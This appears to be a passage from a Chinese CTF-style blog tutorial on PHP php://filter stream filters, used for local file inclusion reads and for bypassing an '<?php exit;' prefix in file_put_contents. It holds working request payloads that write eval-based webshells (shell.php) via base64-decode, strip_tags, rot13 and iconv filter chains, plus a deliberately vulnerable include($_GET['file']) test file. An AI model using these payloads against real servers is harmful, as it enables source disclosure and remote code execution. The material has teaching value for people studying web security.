class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221017181747756.png" alt="image-20221017181747756"> </p><p>示例1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">获取并输出网站首页 HTML 源码<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$homepage</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;http://www.example.com/&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$homepage</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h3><p>将数据写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">int</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221017182407459.png" alt="image-20221017182407459"> </p><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 明文读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter/resource=file.txt<br><br><span class="hljs-comment"># 编码读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=file.txt<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 明文读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter/resource=file.txt<br><br><span class="hljs-comment"># 编码读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=file.txt<br></code></pre></td></tr></table></figure><h2 id="过滤器和他的朋友们"><a href="#过滤器和他的朋友们" class="headerlink" title="过滤器和他的朋友们"></a>过滤器和他的朋友们</h2><p><a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 字符串过滤器</span><br>string.rot13       <span class="hljs-regexp">//</span>rot13转换<br>string.toupper     <span class="hljs-regexp">//</span>将字符大写<br>string.tolower     <span class="hljs-regexp">//</span>将字符小写<br>string.strip_tags  <span class="hljs-regexp">//</span>去除空字符、HTML和PHP标记后的结果<br><br><span class="hljs-comment"># 转换过滤器</span><br>convert.base64-encode       <span class="hljs-regexp">//</span>base64编码<br>convert.base64-decode       <span class="hljs-regexp">//</span>base64解码<br>convert.quoted-printable-encode <span class="hljs-regexp">//</span>quoted-printable编码<br>convert.quoted-printable-decode <span class="hljs-regexp">//</span>quoted-printable解码<br>convert.iconv                   <span class="hljs-regexp">//</span>实现任意两种编码之间的转换<br><br><span class="hljs-comment"># 压缩过滤器</span><br>zlib.deflate       <span class="hljs-regexp">//</span>压缩过滤器<br>zlib.inflate       <span class="hljs-regexp">//</span>解压过滤器<br>bzip2.compress     <span class="hljs-regexp">//</span>压缩过滤器<br>bzip2.decompress   <span class="hljs-regexp">//</span>解压过滤器<br><br><span class="hljs-comment"># 加密过滤器</span><br>mcrypt.*    <span class="hljs-regexp">//</span>加密过滤器<br>mdecrypt.*  <span class="hljs-regexp">//</span>解密过滤器<br><br></code></pre></td></tr></table></figure><p>用来测试的源代码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>flag.php</p><p><img src="D:/mdimage/20201026234419943.png" alt="在这里插入图片描述"> </p><h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>str_rot13 — 对字符串执行 ROT13 转换. ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"> </p><h4 id="string-toupper，strtoupper"><a href="#string-toupper，strtoupper" class="headerlink" title="string.toupper，strtoupper"></a>string.toupper，strtoupper</h4><p>将字符串转化为大写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.toupper/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-16660921967607.png" alt="在这里插入图片描述"> </p><h4 id="string-tolower，strtolower"><a href="#string-tolower，strtolower" class="headerlink" title="string.tolower，strtolower"></a>string.tolower，strtolower</h4><p>将字符串转化为小写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.tolower/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609221798310.png" alt="在这里插入图片描述"> </p><h4 id="string-strip-tags，strip-tags"><a href="#string-strip-tags，strip-tags" class="headerlink" title="string.strip_tags，strip_tags"></a>string.strip_tags，strip_tags</h4><p> 从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。</p><blockquote><p>注意：HTML标签和 PHP 标签<code>&lt;?代码?&gt;</code>也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609224764216.png" alt="在这里插入图片描述"> </p><p>php标签里所有东西都会被去除，html只有标签会被去除，里面的文字不会删除。</p><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609226805119.png" alt="在这里插入图片描述"> </p><h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><h4 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h4><p><code>convert.base64-encode</code>和<code>convert.base64-decode</code>使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 </p><blockquote><p>base-decode有这么一些注意事项</p><p>1、base64解码时是4bytes一组，因此将目标字符解码成乱码时需手动添加字符凑够4的倍数</p><p>2、<code>convert.base64-decode</code>过滤器读文件时会将一些非base64字符给过滤掉后再进行<code>decode</code>，和一些过滤器组合可以用来删除文件内容</p></blockquote><p>这个过滤器经常使用，base64加密，利用姿势：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609230142422.png" alt="在这里插入图片描述"> </p><h4 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h4><h5 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h5><p>将 8-bit 字符串转换成 quoted-printable 字符串</p><blockquote><p>8-bit字符串：10000000<del>11111111，即ASCII值在128</del>255之间的字符串</p><p>quoted-printable 字符串：<code>=十六进制形式</code>，如&#x3D;42为B</p></blockquote><h5 id="convert-quoted-printable-decode"><a href="#convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-decode"></a>convert.quoted-printable-decode</h5><p>将 quoted-printable 字符串转换为 8-bit 字符串</p><blockquote><p>注意：可以转化从&#x3D;00到&#x3D;FF，即ASCII值从0~255之间的字符串</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.quoted-printable-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609234336925.png" alt="在这里插入图片描述"> </p><h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>简单来说转换编码用的</p><p>以下是两种使用方法</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">convert</span>.iconv.当前编码.目标编码<br>or <br><span class="hljs-built_in">convert</span>.iconv.当前编码/目标编码<br></code></pre></td></tr></table></figure><p>以下是支持的字符集</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br><span class="hljs-attribute">UTF7</span>-IMAP<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br><span class="hljs-attribute">ASCII</span>*<br></code></pre></td></tr></table></figure><blockquote><p>* 表示该编码也可以在正则表达式中使用。 ** 表示该编码自 <strong>PHP</strong> 5.4.0 始可用。</p></blockquote><p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609239702328.png" alt="在这里插入图片描述"> </p><h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><h4 id="zlib-deflate压缩、zlib-inflate解压"><a href="#zlib-deflate压缩、zlib-inflate解压" class="headerlink" title="zlib.deflate压缩、zlib.inflate解压"></a>zlib.deflate压缩、zlib.inflate解压</h4><blockquote><p>自 PHP 5.1.0 起，在激活 zlib的前提下可用。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。</p></blockquote><p>相对于压缩封装协议可以在本地文件系统中 创建 gzip 和 bz2 兼容文件，但不可以在网络的流中提供通用压缩的意思，也不可以将一个非压缩的流转换成一个压缩流。压缩过滤器zlib.*可以在任何时候应用于任何流资源。</p><blockquote><p>注意: 压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/zlib.deflate/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609243591531.png" alt="在这里插入图片描述"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/zlib.deflate|zlib.inflate/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609245545634.png" alt="在这里插入图片描述"> </p><p>下面是一个实例</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">0</span>deval(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">/resource=Cyc1e.php</span><br></code></pre></td></tr></table></figure><h4 id="bzip2-compress、bzip2-decompress"><a href="#bzip2-compress、bzip2-decompress" class="headerlink" title="bzip2.compress、bzip2.decompress"></a>bzip2.compress、bzip2.decompress</h4><p>自PHP 5.1.0 起，在激活 bz2支持的前提下可用。也可以通过安装来自 » PECL的 » bz2_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中不可用。</p><p>工作方式与上面相同</p><h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><h4 id="mcrypt-、mdecrypt"><a href="#mcrypt-、mdecrypt" class="headerlink" title="mcrypt.*、mdecrypt.*"></a>mcrypt.*、mdecrypt.*</h4><p><code>mcrypt.*</code>和 <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code>，其中 <code>ciphername</code>是密码的名字，将被传递给 <code>mcrypt_module_open()。</code></p><p>过滤器参数</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">默认值</th><th align="left">取值举例</th></tr></thead><tbody><tr><td align="left">mode</td><td align="left">可选</td><td align="left">cbc</td><td align="left">cbc, cfb, ecb, nofb, ofb, stream</td></tr><tr><td align="left">algorithms_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.algorithms_dir’)</td><td align="left">algorithms 模块的目录</td></tr><tr><td align="left">modes_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.modes_dir’)</td><td align="left">modes 模块的目录</td></tr><tr><td align="left">iv</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td align="left">key</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table><h2 id="单一过滤器的情况"><a href="#单一过滤器的情况" class="headerlink" title="单一过滤器的情况"></a>单一过滤器的情况</h2><p>下面payload都省略了write参数，因为在使用<code>file_put_contents</code>函数时会自动使用write参数。</p><h3 id="绕过不同变量"><a href="#绕过不同变量" class="headerlink" title="绕过不同变量"></a>绕过不同变量</h3><p>测试代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$content</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p><h4 id="方法一-base64编码"><a href="#方法一-base64编码" class="headerlink" title="方法一(base64编码)"></a>方法一(base64编码)</h4><p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br><span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p><img src="D:\mdimage\image-20221016203453907.png" alt="image-20221016203453907"> </p><p><img src="D:\mdimage\image-20221016203436236.png" alt="image-20221016203436236"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ0EnXSk7ID8+&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-decode/</span>resource=shell.php<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\image-20221016203518644.png" alt="image-20221016203518644"> </p><p>成功加载</p><h4 id="方法二（string-strip-tags）"><a href="#方法二（string-strip-tags）" class="headerlink" title="方法二（string.strip_tags）"></a>方法二（string.strip_tags）</h4><p>其实，除了使用base64特性的方法外，我们还可以利用php:&#x2F;&#x2F;filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p><p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\thum-499a1469385895.png" alt="QQ截图20160725010403.png"> </p><p>解释一下<code>string.strip_tags</code></p><p>strip_tags — 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。</p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终的数据包如下：</p><p><img src="D:\mdimage\image-20221016203825931.png" alt="image-20221016203825931"> </p><p><img src="D:\mdimage\image-20221016203840352.png" alt="image-20221016203840352"> </p><p><img src="D:/mdimage/image-20221112155449760.png" alt="image-20221112155449760"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">txt=PD9waHAgZXZhbCgkX1BPU1RbJ0EnXSk7ID8+&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.base64-decode/</span>resource=shell.php<br></code></pre></td></tr></table></figure><h4 id="方法三-string-rot13"><a href="#方法三-string-rot13" class="headerlink" title="方法三(string.rot13)"></a>方法三(string.rot13)</h4><p>str_rot13() 函数对字符串执行 ROT13 编码。 ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。 编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串</p><p>利用php:&#x2F;&#x2F;filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。<code>&lt;?php exit;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg();</code>，不过这种利用手法的前提是PHP不开启short_open_tag。</p><p><strong>条件：short_open_tag&#x3D;off</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13/</span>resource=tyskill.php&amp;content=&lt;?cuc cucvasb();<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018185853627.png" alt="image-20221018185853627"> </p><p>成功写入并执行</p><p>具体要使用的时候就改变后面的<code>&lt;?cuc cucvasb();</code>，用hackerbar编码即可</p><p><img src="D:/mdimage/image-20221018190110538.png" alt="image-20221018190110538"> </p><h4 id="方法四-convert-iconv"><a href="#方法四-convert-iconv" class="headerlink" title="方法四(convert.iconv.*)"></a>方法四(convert.iconv.*)</h4><p><code>&lt;?php exit();</code>字符一共13位</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># usc-2: 对目标字符串进行2位一反转</span><br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=tyskill.php&amp;content=tyskill?&lt;hp phpipfn(o;)<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018185645933.png" alt="image-20221018185645933"> </p><p>均能成功生成文件并且执行</p><p>使用方法可以参考前面的过滤器介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$A</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&quot;&lt;?php phpinfo();&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$A</span>;<br></code></pre></td></tr></table></figure><h3 id="绕过相同变量"><a href="#绕过相同变量" class="headerlink" title="绕过相同变量"></a>绕过相同变量</h3><h4 id="base64（还没搞明白）"><a href="#base64（还没搞明白）" class="headerlink" title="base64（还没搞明白）"></a>base64（还没搞明白）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容exit这个关键代码写入shell后门。</p><p>直接来一波构造base64好吧</p><p>或者下面这一个也可以</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure><p>这样一来拼接起来就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();php:<span class="hljs-comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></code></pre></td></tr></table></figure><p>然后进行一个整体的base64解码从而分解掉死亡代码</p><p><img src="D:/mdimage/image-20221017184408798.png" alt="image-20221017184408798"> 